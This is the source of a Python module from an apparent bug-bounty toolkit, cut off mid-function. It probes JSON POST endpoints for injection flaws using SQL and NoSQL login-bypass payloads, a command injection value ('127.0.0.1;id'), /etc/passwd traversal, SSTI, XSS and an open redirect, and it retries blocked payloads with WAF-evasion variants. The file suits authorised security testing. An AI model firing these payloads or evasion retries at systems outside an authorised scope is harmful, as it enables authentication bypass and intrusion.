#!/usr/bin/env python3
"""POST-JSON injection probe.

Closes the scanner gap where sqli/auth_bypass lanes only test GET ?param=
URLs and miss the modern attack surface of REST APIs with JSON bodies (e.g.
Juice Shop `/rest/user/login` SQLi via `email`: `' OR 1=1--`).

Workflow:
  1. Collect target endpoints (either via --endpoints-file or by reading
     js_intel hypotheses for POST patterns).
  2. For each endpoint with discovered JSON fields, send a baseline POST and
     a series of injection payloads (SQLi / SSTI / cmd-inj / open-redirect /
     auth-bypass) per string field.
  3. Three-stage detection:
       a. strong-signal: JWT-shaped token + admin role markers in response
          (only for auth endpoints with payloads designed to log in)
       b. SQL-error fingerprint + structural diff > 20%
       c. time delay > 4s when payload includes SLEEP(5)
  4. Write per-hit JSON + curl reproducer under findings/<t>/poc/json_inject/

Designed to be safe (read-only / login-style probes), bounded by request count
limits, fail-open on network errors.

CLI:
    python3 -m tools.json_inject_probe \
        --target localhost:3000 \
        --endpoints recon/localhost:3000/browser/xhr_endpoints.txt \
        [--js-intel findings/localhost:3000/js_intel/hypotheses.json] \
        [--max-requests 60]
"""

from __future__ import annotations

import argparse
import hashlib
import json
import os
import re
import sys
import tempfile
import time
import urllib.parse
import urllib.request
from pathlib import Path

TOOLS_DIR = Path(__file__).resolve().parent
BASE_DIR = TOOLS_DIR.parent

try:
    from tools.auth_session import AuthSession, add_cli_args, session_from_args
    from tools.browser_surface import public_url_shape
    from tools.sql_payloads import SQL_PAYLOADS
    from tools.target_paths import canonical_target_value, target_storage_key, url_belongs_to_target
    from tools.waf_encoder import base64_wrap_xss, tab_newline_space
    from tools.waf_pass_plan import DEFAULT_AI_VARIANTS, MAX_AI_VARIANTS, load_plan, select_variants
    from tools.waf_response_analyzer import LogIDExtractor, ResponseFingerprint, WAFSignatureDB
except ImportError:  # pragma: no cover
    sys.path.insert(0, str(TOOLS_DIR))
    from auth_session import AuthSession, add_cli_args, session_from_args  # type: ignore
    from browser_surface import public_url_shape  # type: ignore
    from sql_payloads import SQL_PAYLOADS  # type: ignore
    from target_paths import canonical_target_value, target_storage_key, url_belongs_to_target  # type: ignore
    from waf_encoder import base64_wrap_xss, tab_newline_space  # type: ignore
    from waf_pass_plan import DEFAULT_AI_VARIANTS, MAX_AI_VARIANTS, load_plan, select_variants  # type: ignore
    from waf_response_analyzer import LogIDExtractor, ResponseFingerprint, WAFSignatureDB  # type: ignore

USER_AGENT = "claude-bug-bounty/json_inject_probe"
MAX_WAF_RETRIES = 2
SUMMARY_SCHEMA_VERSION = 2
SUMMARY_ITEM_LIMIT = 100
CURSOR_SCHEMA_VERSION = 1
_WAF_DB = WAFSignatureDB()
_WAF_LOG_IDS = LogIDExtractor(_WAF_DB)

# Non-SQL JSON probes remain local; SQL families live in the shared catalog.
_LEGACY_PAYLOADS: list[dict] = [
    {"class": "ssti", "value": "{{7*7}}", "field_hint": ".*"},
    {"class": "cmd_injection", "value": "127.0.0.1;id", "field_hint": "host|ip|target|server|url"},
    {"class": "open_redirect", "value": "https://evil.example.com", "field_hint": "url|redirect|return|next|to|callback"},
    {"class": "path_traversal", "value": "../../etc/passwd", "field_hint": "file|path|page|template|name"},
    {"class": "xss", "value": "<svg/onload=alert(1)>", "field_hint": ".*"},
    # NoSQL operator injection — sends a dict where the server expects a string.
    # Mongo/Mongoose treat {"$ne": null} as "not equal null" → matches any record.
    {"class": "nosql_op_injection", "value": {"$ne": None}, "field_hint": "password|pwd|secret|token|email|user|login"},
    # NoSQL regex bypass — wildcard regex matches every row for the field.
    {"class": "nosql_regex_bypass", "value": {"$regex": ".*"}, "field_hint": "email|user|login|name|account|username"},
    # GraphQL introspection probe — fires only on `query`-shaped fields. Many
    # GraphQL gateways accept POST {"query": "..."} on /graphql and leak the
    # full schema when introspection is left enabled in production.
    {"class": "graphql_introspection", "value": "{ __schema { types { name } } }", "field_hint": "query|gql|graphql"},
]

# Keep non-SQL JSON probes local while all SQL transports share one catalog.
PAYLOADS: list[dict] = [
    *SQL_PAYLOADS,
    *[item for item in _LEGACY_PAYLOADS if not str(item.get("class", "")).startswith("sqli_")],
]

# Strong-signal regexes scanned in response bodies.
JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{6,}")
ADMIN_ROLE_RE = re.compile(r'"role"\s*:\s*"(admin|root|superuser)"', re.I)
SQL_ERROR_RE = re.compile(
    r"SQLITE_ERROR|SQLiteException|SQL syntax|You have an error in your SQL syntax|sqlite3\.|"
    r"ORA-\d+|mysqli?_\w+|PG::\w+|SQLSTATE\[\w+\]|XPATH syntax error|"
    r"invalid input syntax for type|division by zero|Division by 0|near \"[^\"]*\": syntax error|"
    r"unterminated quoted string|Unclosed quotation mark|ODBC SQL Server Driver|Microsoft OLE DB Provider",
    re.I,
)
SSTI_PROOF_RE = re.compile(r"\b49\b")
CMD_PROOF_RE = re.compile(r"uid=\d+\([^)]+\)|gid=\d+|groups=", re.I)
PATH_PROOF_RE = re.compile(r"root:[x*]:0:0:", re.I)
# GraphQL introspection success — both keys must appear together so we don't
# false-positive on a 404 page that happens to mention "__schema".
GRAPHQL_INTROSPECTION_RE = re.compile(r'"__schema"\s*:\s*\{|"types"\s*:\s*\[\s*\{\s*"name"', re.I)
# Class groups that share a detection signal.
AUTH_BYPASS_CLASSES = (
    "sqli_auth_bypass",
    "sqli_boolean_true",
    "sqli_boolean_false",
    "nosql_op_injection",
    "nosql_regex_bypass",
)
SQL_ERROR_CLASSES = (
    "sqli_error",
    "sqli_error_based",
    "sqli_auth_bypass",
    "sqli_boolean_true",
    "sqli_boolean_false",
    "sqli_boolean_blind",
    "sqli_numeric",
    "sqli_arithmetic",
    "sqli_time",
    "sqli_union",
    "sqli_waf_bypass",
)


# ---------------------------------------------------------------------------
# Endpoint discovery


def _collect_endpoints(args: argparse.Namespace) -> tuple[list[dict], dict]:
    """Return accepted POST endpoints and bounded skip metadata."""
    endpoints: list[dict] = []
    seen: set[str] = set()
    skipped = {
        "out_of_scope": 0,
        "unsupported_method": 0,
        "invalid_url": 0,
        "items": [],
    }

    def reject(reason: str, url: object = "", method: object = "") -> None:
        skipped[reason] += 1
        if len(skipped["items"]) < 10:
            skipped["items"].append({
                "reason": reason,
                "method": str(method or "").upper(),
                "url": public_url_shape(str(url or "")),
            })

    def accept(url: object, method: object, body: object, source: str) -> None:
        raw_url = str(url or "").strip()
        method_name = str(method or "POST").strip().upper()
        parsed = urllib.parse.urlparse(raw_url)
        if not raw_url or parsed.scheme not in {"http", "https"} or not parsed.hostname:
            reject("invalid_url", raw_url, method_name)
            return
        if method_name != "POST":
            reject("unsupported_method", raw_url, method_name)
            return
        if not url_belongs_to_target(raw_url, args.target):
            reject("out_of_scope", raw_url, method_name)
            return
        template = body if isinstance(body, dict) else {}
        identity = json.dumps(
            [method_name, raw_url, template],
            sort_keys=True,
            separators=(",", ":"),
            ensure_ascii=False,
        )
        if identity in seen:
            return
        seen.add(identity)
        endpoints.append({
            "method": method_name,
            "url": raw_url,
            "body_template": template,
            "source": source,
        })

    if args.endpoints_file:
        ep_path = Path(args.endpoints_file).expanduser().resolve()
        if ep_path.is_file():
            for line in ep_path.read_text(encoding="utf-8", errors="replace").splitlines():
                line = line.strip()
                if not line:
                    continue
                # Accept either bare URL or JSON {"method":"POST","url":"..."}
                if line.startswith("{"):
                    try:
                        item = json.loads(line)
                    except (json.JSONDecodeError, TypeError):
                        reject("invalid_url")
                        continue
                    if not isinstance(item, dict):
                        reject("invalid_url")
                        continue
                    url = item.get("url")
                    method = item.get("method") or "POST"
                    body = item.get("body") or item.get("request_body") or {}
                else:
                    url = line
                    method = "POST"
                    body = {}
                accept(url, method, body, "endpoints_file")

    # Pull common login/auth POST endpoints from js_intel hypotheses as a default
    # set when nothing more concrete was supplied. We hand-curate the fields so
    # the probe does not blindly explode parameter combinations.
    if args.js_intel:
        ji_path = Path(args.js_intel).expanduser().resolve()
        if ji_path.is_file():
            try:
                ji = json.loads(ji_path.read_text(encoding="utf-8"))
            except Exception:
                ji = {}
            base = f"http://{args.target}" if "://" not in args.target else args.target.rstrip("/")
            for path, template in _login_seeds_from_js_intel(ji):
                url = base + path
                accept(url, "POST", template, "js_intel_seed")

    # Heuristic baseline seeds for any target — covers common REST login shapes.
    if not endpoints and args.add_default_seeds:
        base = f"http://{args.target}" if "://" not in args.target else args.target.rstrip("/")
        for path, template in DEFAULT_LOGIN_SEEDS:
            accept(base + path, "POST", template, "default_seed")

    return endpoints, skipped


DEFAULT_LOGIN_SEEDS: list[tuple[str, dict]] = [
    ("/rest/user/login", {"email": "test@test", "password": "x"}),
    ("/api/login", {"username": "test", "password": "x"}),
    ("/api/auth/login", {"username": "test", "password": "x"}),
    ("/login", {"username": "test", "password": "x"}),
    ("/auth/login", {"email": "test@test", "password": "x"}),
]


def _login_seeds_from_js_intel(ji: dict) -> list[tuple[str, dict]]:
    """Pull plausible login endpoints from js_intel and pair with a template body."""
    seeds: list[tuple[str, dict]] = []
    rest = ji.get("endpoints", {}).get("rest_custom", []) if isinstance(ji, dict) else []
    rest_api = ji.get("endpoints", {}).get("rest_api_crud", []) if isinstance(ji, dict) else []
    pool = list(rest) + list(rest_api)
    for ep in pool:
        if not isinstance(ep, str):
            continue
        lower = ep.lower()
        if "login" in lower or "auth" in lower or "signin" in lower:
            seeds.append((ep, {"email": "test@test", "password": "x"}))
        elif "register" in lower or "signup" in lower:
            seeds.append((ep, {"email": "test@test", "password": "x", "username": "tester"}))
    return seeds


# ---------------------------------------------------------------------------
# HTTP plumbing


class OutOfScopeRedirect(ValueError):
    """Raised before urllib follows a redirect outside the active target."""


class _ScopedRedirectHandler(urllib.request.HTTPRedirectHandler):
    def __init__(self, target: str, session: AuthSession | None = None):
        self.target = target
        self.session = session

    def redirect_request(self, req, fp, code, msg, headers, newurl):  # type: ignore[no-untyped-def]
        if not url_belongs_to_target(newurl, self.target):
            raise OutOfScopeRedirect(public_url_shape(newurl))
        redirected = super().redirect_request(req, fp, code, msg, headers, newurl)
        if redirected is not None and self.session is not None and not self.session.allows_url(newurl):
            for name in self.session.sensitive_header_names():
                redirected.remove_header(name)
                redirected.remove_unredirected_header(name)
        return redirected


def _http_post_json(
    url: str,
    body: dict,
    timeout: float = 10.0,
    *,
    target: str = "",
    session: AuthSession | None = None,
) -> dict:
    """Return status, body, headers, latency, and any transport error."""
    if target and not url_belongs_to_target(url, target):
        return {
            "status": 0,
            "body_text": "",
            "body_size": 0,
            "headers": "",
            "latency": 0.0,
            "error": f"OutOfScopeURL:{public_url_shape(url)}",
        }
    data = json.dumps(body).encode("utf-8")
    req = urllib.request.Request(
        url,
        data=data,
        headers={
            "User-Agent": USER_AGENT,
            "Content-Type": "application/json",
            "Accept": "application/json,text/html;q=0.9,*/*;q=0.1",
            **(session.headers_for_url(url) if session is not None else {}),
        },
        method="POST",
    )
    t0 = time.time()
    try:
        opener = urllib.request.build_opener(_ScopedRedirectHandler(target or url, session))
        with opener.open(req, timeout=timeout) as resp:
            raw = resp.read(64 * 1024)
            return {
                "status": resp.status,
                "body_text": raw.decode("utf-8", errors="replace"),
                "body_size": len(raw),
                "headers": "\n".join(f"{key}: {value}" for key, value in resp.headers.items()),
                "latency": time.time() - t0,
                "error": None,
            }
    except urllib.error.HTTPError as e:
        try:
            raw = e.read(64 * 1024)
        except Exception:
            raw = b""
        return {
            "status": e.code,
            "body_text": raw.decode("utf-8", errors="replace"),
            "body_size": len(raw),
            "headers": "\n".join(f"{key}: {value}" for key, value in (e.headers or {}).items()),
            "latency": time.time() - t0,
            "error": None,
        }
    except Exception as exc:
        return {
            "status": 0,
            "body_text": "",
            "body_size": 0,
            "headers": "",
            "latency": time.time() - t0,
            "error": f"{type(exc).__name__}:{exc}",
        }


def _curl_reproducer(url: str, body: dict) -> str:
    body_str = json.dumps(body).replace("'", "'\\''")
    return f"curl -sk -X POST '{url}' -H 'Content-Type: application/json' -d '{body_str}'"


def _response_fingerprint(response: dict) -> ResponseFingerprint:
    body = str(response.get("body_text") or "")
    return ResponseFingerprint.build(
        body,
        str(response.get("headers") or ""),
        status_code=int(response.get("status") or 0),
        body_length=int(response.get("body_size") or len(body.encode("utf-8"))),
        response_time_ms=float(response.get("latency") or 0.0) * 1000.0,
        db=_WAF_DB,
        extractor=_WAF_LOG_IDS,
    )


def _waf_observation(baseline: dict, response: dict) -> dict:
    """Classify only new block signals relative to the endpoint baseline."""
    if baseline.get("error") or int(baseline.get("status") or 0) <= 0:
        return {
            "blocked": False,
            "vendor": None,
            "signals": [],
            "status": int(response.get("status") or 0),
            "outcome": "baseline_unavailable",
        }
    if response.get("error") or int(response.get("status") or 0) <= 0:
        return {
            "blocked": False,
            "vendor": None,
            "signals": [],
            "status": int(response.get("status") or 0),
            "outcome": "transport_error",
        }
    base = _response_fingerprint(baseline)
    probe = _response_fingerprint(response)
    base_body_vendors = set(_WAF_DB.match_vendors(str(baseline.get("body_text") or ""), ""))
    probe_body_vendors = set(_WAF_DB.match_vendors(str(response.get("body_text") or ""), ""))
    base_header_vendors = set(_WAF_DB.match_vendors("", str(baseline.get("headers") or "")))
    probe_header_vendors = set(_WAF_DB.match_vendors("", str(response.get("headers") or "")))

    signals: list[str] = []
    if probe_body_vendors - base_body_vendors:
        signals.append("new_vendor_body")
    if probe_header_vendors - base_header_vendors:
        signals.append("new_vendor_header")
    if probe.has_block_title and not base.has_block_title:
        signals.append("block_title")
    if probe.has_challenge_signal and not base.has_challenge_signal:
        signals.append("challenge")
    if int(response.get("status") or 0) in {403, 406} and int(baseline.get("status") or 0) not in {403, 406}:
        signals.append("block_status_delta")

    vendors = sorted((probe_body_vendors | probe_header_vendors) - (base_body_vendors | base_header_vendors))
    if not vendors:
        vendors = probe.vendor_hits
    outcome = "waf_blocked" if signals else "application_response"
    if not signals and probe.status_code == 429:
        outcome = "rate_limited"
    return {
        "blocked": bool(signals),
        "vendor": vendors[0] if vendors else None,
        "signals": signals,
        "status": probe.status_code,
        "outcome": outcome,
    }


def _waf_variants(payload_class: str, payload_value: object) -> list[tuple[str, str]]:
    """Return a bounded set of semantic variants only for supported strings."""
    if not isinstance(payload_value, str):
        return []
    if payload_class.startswith("sqli_"):
        candidates = dict(tab_newline_space(payload_value))
        techniques = ("space-to-/**/-comment", "space-to-tab")
    elif payload_class == "xss":
        candidates = dict(base64_wrap_xss(payload_value))
        techniques = ("xss-base64-svg-onload", "xss-base64-img-onerror")
    else:
        return []
    return [
        (name, candidates[name])
        for name in techniques
        if name in candidates and candidates[name] != payload_value
    ][:MAX_WAF_RETRIES]


def _waf_retry_variants(
    plan: dict | None,
    *,
    url: str,
    field: str,
    payload: dict,
) -> list[dict]:
    """Prefer evidence-linked AI decisions, then fill remaining slots statically."""
    value = payload.get("value")
    retry_limit = MAX_WAF_RETRIES
    if plan is not None:
        retry_limit = min(MAX_AI_VARIANTS, int(plan.get("max_variants", DEFAULT_AI_VARIANTS)))
    candidates: list[dict] = []
    seen_values: set[str] = set()
    for item in select_variants(
        plan,
        url=url,
        payload_class=str(payload.get("class") or ""),
        field=field,
        canonical_value=value,
        limit=retry_limit,
    ):
        variant_value = str(item.get("value") or "")
        if not variant_value or variant_value in seen_values:
            continue
        seen_values.add(variant_value)
        candidates.append({"id": item.get("id", "ai-variant"), "value": variant_value, "source": "ai", **item})
    for technique, variant_value in _waf_variants(str(payload.get("class") or ""), value):
        if variant_value in seen_values:
            continue
        seen_values.add(variant_value)
        candidates.append({"id": technique, "technique": technique, "value": variant_value, "source": "fallback"})
    return candidates[:retry_limit]


# ---------------------------------------------------------------------------
# Probe logic


def _detect_hit(
    payload_class: str,
    baseline: dict,
    response: dict,
    payload_value: str,
    *,
    min_delay: float = 4.0,
) -> dict:
    """Return {hit: bool, signal: str, evidence: str}."""
    out = {"hit": False, "signal": "", "evidence": ""}
    if (
        baseline.get("error")
        or response.get("error")
        or int(baseline.get("status") or 0) <= 0
        or int(response.get("status") or 0) <= 0
    ):
        return out
    body = response.get("body_text", "")
    base_body = baseline.get("body_text", "")

    # Strong signal A: JWT + admin role appeared (login bypass via SQLi or NoSQL operator/regex)
    jwt = JWT_RE.search(body)
    role = ADMIN_ROLE_RE.search(body) or ADMIN_ROLE_RE.search(_decode_jwt_payload(jwt.group(0)) if jwt else "")
    if jwt and payload_class in AUTH_BYPASS_CLASSES:
        out["hit"] = True
        if payload_class == "sqli_auth_bypass":
            out["signal"] = "auth_bypass_jwt_returned"
        else:
            out["signal"] = f"{payload_class}_jwt_returned"
        out["evidence"] = f"jwt_prefix={jwt.group(0)[:40]}...; role_match={'yes' if role else 'unknown'}"
        return out

    # Strong signal B: SQL error fingerprint
    if payload_class in SQL_ERROR_CLASSES and SQL_ERROR_RE.search(body):
        out["hit"] = True
        out["signal"] = "sql_error_fingerprint"
        out["evidence"] = SQL_ERROR_RE.search(body).group(0)[:120]
        return out

    # Strong signal C: time-based blind SQLi
    if (
        payload_class == "sqli_time"
        and response.get("latency", 0) >= min_delay
        and baseline.get("latency", 0) < 2.0
    ):
        out["hit"] = True
        out["signal"] = "sqli_time_delay"
        out["evidence"] = f"baseline={baseline['latency']:.2f}s probe={response['latency']:.2f}s"
        return out

    # Strong signal D: SSTI execution (7*7=49)
    if payload_class == "ssti" and SSTI_PROOF_RE.search(body) and not SSTI_PROOF_RE.search(base_body):
        out["hit"] = True
        out["signal"] = "ssti_evaluation"
        out["evidence"] = "response contains 49 (7*7) where baseline did not"
        return out

    # Strong signal E: command injection
    if payload_class == "cmd_injection" and CMD_PROOF_RE.search(body):
        out["hit"] = True
        out["signal"] = "cmd_injection_uid_disclosure"
        out["evidence"] = CMD_PROOF_RE.search(body).group(0)
        return out

    # Strong signal F: path traversal hit
    if payload_class == "path_traversal" and PATH_PROOF_RE.search(body):
        out["hit"] = True
        out["signal"] = "path_traversal_etc_passwd"
        out["evidence"] = "/etc/passwd content detected in response"
        return out

    # Strong signal G: XSS reflection of payload verbatim
    if (
        payload_class == "xss"
        and isinstance(payload_value, str)
        and payload_value in body
        and payload_value not in base_body
    ):
        out["hit"] = True
        out["signal"] = "xss_reflection"
        out["evidence"] = "payload reflected verbatim"
        return out

    # Strong signal H: open redirect (302/3xx with Location matching payload)
    # (urllib follows redirects; this is best-effort via body / status only.)
    if payload_class == "open_redirect" and response.get("status") in (301, 302, 303, 307, 308):
        if payload_value in body or "evil.example.com" in body:
            out["hit"] = True
            out["signal"] = "open_redirect_external_location"
            out["evidence"] = f"3xx with payload echoed (status={response['status']})"
            return out

    # Strong signal I: GraphQL introspection enabled. The schema leak is itself
    # a Medium finding (priv-esc playbook + hidden mutation discovery), so we
    # require the baseline to NOT contain the introspection markers to avoid
    # false-positives on GraphQL playgrounds that 200/echo on any request.
    if payload_class == "graphql_introspection":
        if GRAPHQL_INTROSPECTION_RE.search(body) and not GRAPHQL_INTROSPECTION_RE.search(base_body):
            out["hit"] = True
            out["signal"] = "graphql_introspection_enabled"
            match = GRAPHQL_INTROSPECTION_RE.search(body)
            out["evidence"] = f"introspection marker present: {match.group(0)[:80]}"
            return out

    return out


def _decode_jwt_payload(jwt: str) -> str:
    try:
        parts = jwt.split(".")
        if len(parts) < 2:
            return ""
        import base64
        seg = parts[1] + "=" * (-len(parts[1]) % 4)
        return base64.urlsafe_b64decode(seg).decode("utf-8", errors="replace")
    except Exception:
        return ""


def _field_eligible(field: str, payload: dict) -> bool:
    hint = payload.get("field_hint") or ".*"
    return bool(re.search(hint, field, re.I))


def _response_shape(response: dict) -> tuple:
    """Return a compact shape for boolean true/false comparison."""
    body = str(response.get("body_text") or "")
    try:
        parsed = json.loads(body)
    except (TypeError, json.JSONDecodeError):
        return ("text", len(body))
    if isinstance(parsed, dict):
        return ("object", tuple(sorted(str(key) for key in parsed)))
    if isinstance(parsed, list):
        return ("array", len(parsed))
    return (type(parsed).__name__, str(parsed)[:80])


def _boolean_pair_detection(true_response: dict, false_response: dict) -> dict:
    """Promote only a material true/false response difference."""
    if (
        true_response.get("error")
        or false_response.get("error")
        or int(true_response.get("status") or 0) <= 0
        or int(false_response.get("status") or 0) <= 0
    ):
        return {"hit": False, "signal": "", "evidence": ""}
    true_status = int(true_response.get("status") or 0)
    false_status = int(false_response.get("status") or 0)
    true_body = str(true_response.get("body_text") or "")
    false_body = str(false_response.get("body_text") or "")
    size_delta = abs(len(true_body.encode("utf-8")) - len(false_body.encode("utf-8")))
    shape_changed = _response_shape(true_response) != _response_shape(false_response)
    if true_status == false_status and size_delta < 32 and not shape_changed:
        return {"hit": False, "signal": "", "evidence": ""}
    return {
        "hit": True,
        "signal": "sqli_boolean_pair_difference",
        "evidence": (
            f"true_status={true_status} false_status={false_status}; "
            f"body_delta={len(false_body.encode('utf-8')) - len(true_body.encode('utf-8'))}; "
            f"shape_changed={'yes' if shape_changed else 'no'}"
        ),
    }


def _send_json(
    url: str,
    body: dict,
    timeout: float,
    *,
    target: str,
    session: AuthSession | None,
) -> dict:
    if target or session is not None:
        return _http_post_json(url, body, timeout, target=target, session=session)
    return _http_post_json(url, body, timeout)


def _payload_plan(payloads: list[dict] | None = None) -> list[dict]:
    """Put one probe from every class ahead of deeper family variants."""
    source = payloads if payloads is not None else PAYLOADS
    first: list[dict] = []
    rest: list[dict] = []
    seen: set[str] = set()
    for payload in source:
        payload_class = str(payload.get("class") or "")
        if payload_class not in seen:
            seen.add(payload_class)
            first.append(payload)
        else:
            rest.append(payload)
    return first + rest


def _payload_field_plan(
    body_template: dict,
    payloads: list[dict] | None = None,
) -> list[tuple[dict, str]]:
    """Schedule class representatives before field/variant expansion.

    The request budget is per endpoint, not per field. Picking every field for
    the first payload would therefore starve later classes on wide JSON
    bodies. Reserve one eligible field for each class first, then fill the
    remaining budget with the complete matrix.
    """
    string_fields = [
        key for key, value in body_template.items()
        if isinstance(value, (str, int)) or value is None
    ]
    ordered = _payload_plan(payloads)
    representatives: list[tuple[dict, str]] = []
    representative_keys: set[tuple[int, str]] = set()
    seen_classes: set[str] = set()
    for payload in ordered:
        payload_class = str(payload.get("class") or "")
        if payload_class in seen_classes:
            continue
        for field in string_fields:
            if _field_eligible(field, payload):
                representatives.append((payload, field))
                representative_keys.add((id(payload), field))
                seen_classes.add(payload_class)
                break

    remainder = [
        (payload, field)
        for payload in ordered
        for field in string_fields
        if _field_eligible(field, payload)
        and (id(payload), field) not in representative_keys
    ]
    return representatives + remainder


def _record_request(stats: dict | None, response: dict) -> None:
    if stats is None:
        return
    stats["request_count"] = int(stats.get("request_count", 0) or 0) + 1
    error = str(response.get("error") or "")
    if error:
        stats["transport_error_count"] = int(stats.get("transport_error_count", 0) or 0) + 1
    if error.startswith("OutOfScopeRedirect:"):
        stats["out_of_scope_redirect"] = int(stats.get("out_of_scope_redirect", 0) or 0) + 1


def probe_endpoint(
    endpoint: dict,
    max_requests: int,
    *,
    target: str = "",
    session: AuthSession | None = None,
    waf_plan: dict | None = None,
    stats: dict | None = None,
) -> tuple[list[dict], list[dict]]:
    url = endpoint["url"]
    body_template = endpoint.get("body_template") or {}
    if not isinstance(body_template, dict) or not body_template:
        return [], []
    if waf_plan and waf_plan.get("max_requests") is not None:
        max_requests = min(max_requests, int(waf_plan["max_requests"]))

    # baseline call
    baseline = _send_json(url, body_template, 10.0, target=target, session=session)
    _record_request(stats, baseline)
    request_count = 1
    hits: list[dict] = []
    waf_events: list[dict] = []
    pair_responses: dict[tuple[str, str], dict[str, dict]] = {}
    reported_pairs: set[tuple[str, str]] = set()
    if baseline.get("error") or int(baseline.get("status") or 0) <= 0:
        return hits, waf_events

    for payload, field in _payload_field_plan(body_template):
        if request_count >= max_requests:
            return hits, waf_events
        mutated = dict(body_template)
        mutated[field] = payload["value"]
        probe_timeout = 12.0 if payload["class"].startswith("sqli_time") else 8.0
        resp = _send_json(
            url,
            mutated,
            probe_timeout,
            target=target,
            session=session,
        )
        _record_request(stats, resp)
        request_count += 1
        waf = _waf_observation(baseline, resp)
        if waf["outcome"] == "application_response":
            pair_id = str(payload.get("pair_id") or "")
            pair_side = str(payload.get("pair_side") or "")
            pair_key = (field, pair_id)
            pair_detection = {"hit": False, "signal": "", "evidence": ""}
            if pair_id and pair_side in {"true", "false"}:
                pair_responses.setdefault(pair_key, {})[pair_side] = resp
                pair = pair_responses[pair_key]
                if pair_key not in reported_pairs and {"true", "false"}.issubset(pair):
                    pair_detection = _boolean_pair_detection(pair["true"], pair["false"])
                    if pair_detection["hit"]:
                        reported_pairs.add(pair_key)
            detection = pair_detection if pair_detection["hit"] else _detect_hit(
                payload["class"],
                baseline,
                resp,
                payload["value"],
                min_delay=float(payload.get("min_delay", 4.0) or 4.0),
            )
            if detection["hit"]:
                hits.append({
                    "url": url,
                    "method": "POST",
                    "field": field,
                    "payload_class": "sqli_boolean_pair" if pair_detection["hit"] else payload["class"],
                    "payload_value": payload["value"],
                    "payload_family": payload.get("family", payload["class"]),
                    **({"dbms": payload["dbms"]} if payload.get("dbms") else {}),
                    **({"pair_id": pair_id} if pair_detection["hit"] else {}),
                    "signal": detection["signal"],
                    "evidence": detection["evidence"],
                    "response_status": resp["status"],
                    "response_size": resp["body_size"],
                    "response_excerpt": resp["body_text"][:280],
                    "curl": _curl_reproducer(url, mutated),
                })
            continue
        if not waf["blocked"]:
            continue
        waf_events.append({
            "url": url,
            "field": field,
            "payload_class": payload["class"],
            "payload_family": payload.get("family", payload["class"]),
            "technique": "canonical",
            **waf,
        })
        for candidate in _waf_retry_variants(
            waf_plan,
            url=url,
            field=field,
            payload=payload,
        ):
            if request_count >= max_requests:
                return hits, waf_events
            technique = str(candidate.get("technique") or candidate.get("id") or "ai-variant")
            variant = str(candidate.get("value") or "")
            mutated = dict(body_template)
            mutated[field] = variant
            retry = _send_json(
                url,
                mutated,
                probe_timeout,
                target=target,
                session=session,
            )
            _record_request(stats, retry)
            request_count += 1
            retry_waf = _waf_observation(baseline, retry)
            event = {
                "url": url,
                "field": field,
                "payload_class": payload["class"],
                "payload_family": payload.get("family", payload["class"]),
                "technique": technique,
                "variant_source": candidate.get("source", "fallback"),
                **retry_waf,
            }
            if candidate.get("source") == "ai":
                event.update({
                    "variant_id": candidate.get("id", ""),
                    "ai_reason": candidate.get("reason", ""),
                    "expected_signal": candidate.get("expected_signal", ""),
                    "stop_condition": candidate.get("stop_condition", ""),
                    "evidence_refs": candidate.get("evidence_refs", []),
                })
            waf_events.append(event)
            if retry_waf["outcome"] in {"transport_error", "rate_limited"}:
                break
            if retry_waf["blocked"]:
                continue
            detection = _detect_hit(
                payload["class"],
                baseline,
                retry,
                variant,
                min_delay=float(payload.get("min_delay", 4.0) or 4.0),
            )
            if detection["hit"]:
                hit = {
                    "url": url,
                    "method": "POST",
                    "field": field,
                    "payload_class": payload["class"],
                    "payload_value": variant,
                    "payload_family": payload.get("family", payload["class"]),
                    **({"dbms": payload["dbms"]} if payload.get("dbms") else {}),
                    "waf_variant": technique,
                    "signal": detection["signal"],
                    "evidence": detection["evidence"],
                    "response_status": retry["status"],
                    "response_size": retry["body_size"],
                    "response_excerpt": retry["body_text"][:280],
                    "curl": _curl_reproducer(url, mutated),
                    "variant_source": candidate.get("source", "fallback"),
                }
                if candidate.get("source") == "ai":
                    hit.update({
                        "waf_variant_id": candidate.get("id", ""),
                        "ai_reason": candidate.get("reason", ""),
                        "expected_signal": candidate.get("expected_signal", ""),
                        "stop_condition": candidate.get("stop_condition", ""),
                        "evidence_refs": candidate.get("evidence_refs", []),
                    })
                hits.append(hit)
                break
            break
    return hits, waf_events


# ---------------------------------------------------------------------------
# Output writer


def _source_binding(path_value: str) -> dict:
    if not path_value:
        return {}
    path = Path(path_value).expanduser().resolve()
    if not path.is_file():
        return {}
    try:
        display = str(path.relative_to(BASE_DIR))
    except ValueError:
        display = str(path)
    return {
        "path": display,
        "sha256": hashlib.sha256(path.read_bytes()).hexdigest(),
        "size": path.stat().st_size,
    }


def _input_fingerprint(endpoints: list[dict], source_bindings: list[dict]) -> str:
    canonical = {
        "endpoints": [
            {
                "method": str(item.get("method") or "POST"),
                "url": str(item.get("url") or ""),
                "body": item.get("body_template") if isinstance(item.get("body_template"), dict) else {},
            }
            for item in endpoints
        ],
        "sources": source_bindings,
    }
    encoded = json.dumps(canonical, sort_keys=True, separators=(",", ":"), ensure_ascii=False)
    return hashlib.sha256(encoded.encode("utf-8")).hexdigest()


def _probe_cursor(
    summary_path: Path,
    *,
    target: str,
    input_fingerprint: str,
    endpoint_count: int,
    kind: str,
    lane: str = "",
) -> dict:
    """Load a target-owned endpoint batch cursor, or start a fresh batch.

    The cursor is deliberately stored beside the lane summary so Autopilot,
    direct CLI, and the state projection consume the same checkpoint.  A
    changed input fingerprint invalidates it instead of guessing an offset.
    """
    fresh = {
        "start_index": 0,
        "deferred_indices": [],
        "resumed": False,
    }
    if not summary_path.is_file():
        return fresh
    try:
        payload = json.loads(summary_path.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError):
        return fresh
    if (
        not isinstance(payload, dict)
        or payload.get("kind") != kind
        or canonical_target_value(str(payload.get("target") or ""))
        != canonical_target_value(target)
        or str(payload.get("input_fingerprint") or "") != input_fingerprint
        or (lane and str(payload.get("lane") or "") != lane)
    ):
        return fresh
    cursor = payload.get("cursor")
    if not isinstance(cursor, dict) or cursor.get("schema_version") != CURSOR_SCHEMA_VERSION:
        return fresh
    if (
        cursor.get("input_fingerprint") != input_fingerprint
        or cursor.get("endpoint_count") != endpoint_count
        or cursor.get("coverage_complete") is True
    ):
        return fresh
    start_index = cursor.get("next_endpoint_index")
    deferred = cursor.get("deferred_endpoint_indices", [])
    if (
        isinstance(start_index, bool)
        or not isinstance(start_index, int)
        or not 0 <= start_index <= endpoint_count
